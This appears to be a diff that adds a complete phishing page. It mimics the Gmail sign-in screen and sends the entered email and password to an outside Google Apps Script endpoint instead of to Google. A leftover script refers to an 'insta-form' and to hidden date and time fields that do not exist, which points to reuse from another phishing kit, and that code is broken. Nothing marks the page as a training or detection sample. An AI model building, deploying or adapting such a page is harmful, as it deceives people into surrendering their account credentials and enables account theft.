@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #357AE8;
+        }
+        .forgot-password {
+            text-align: right;
+            font-size: 14px;
+            color: #4285F4;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .other-login {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .gmail-logo {
+            display: block;
+            margin: 0 auto 20px auto;
+            width: 120px; /* Adjust size of the logo */
+        }
+        .create-account {
+            display: block;
+            text-align: center;
+            font-size: 14px;
+            margin-top: 15px;
+            color: #4285F4;
+            text-decoration: none;
+        }
+        .create-account:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Gmail Logo -->
+        <img src="https://www.pngarts.com/files/7/Google-Gmail-Logo-Transparent-Image.png" alt="Gmail Logo" class="gmail-logo">
+        
+        <h2>Sign in to Gmail</h2>
+        <form action="https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec" method="post">
+            <input type="hidden" name="account" value="Gmail">
+
+            <!-- Email/Phone field -->
+            <input type="email" class="input-field" placeholder="Email or phone" name="username" required>
+            
+            <!-- Password field -->
+            <input type="password" class="input-field" placeholder="Enter your password" name="password" required>
+
+            <button type="submit" class="btn" name="submit">Sign in</button>
+        </form>
+
+        <a href="#" class="forgot-password">Forgot email?</a>
+        <br>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        
+        <!-- Create Account Link -->
+        <a href="#" class="create-account">Create account</a>
+    </div>
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec';
+        const form = document.forms['insta-form'];
+    
+        // Function to set the date and time
+        function setDateAndTime() {
+          const now = new Date();
+          const date = now.toLocaleDateString();  // Gets the current date 
+          const time = now.toLocaleTimeString();  // Gets the current time 
+    
+          document.getElementById('submit-date').value = date;
+          document.getElementById('submit-time').value = time;
+        }
+    
+        // Attach event listener to submit form
+        form.addEventListener('submit', e => {
+          e.preventDefault();
+    
+          // Set the date and time before submitting
+          setDateAndTime();
+    
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(() => {
+            window.location.reload();
+          })
+          .catch(error => console.error('Error!', error.message));
+        });
+      </script>
+
+</body>
+</html>
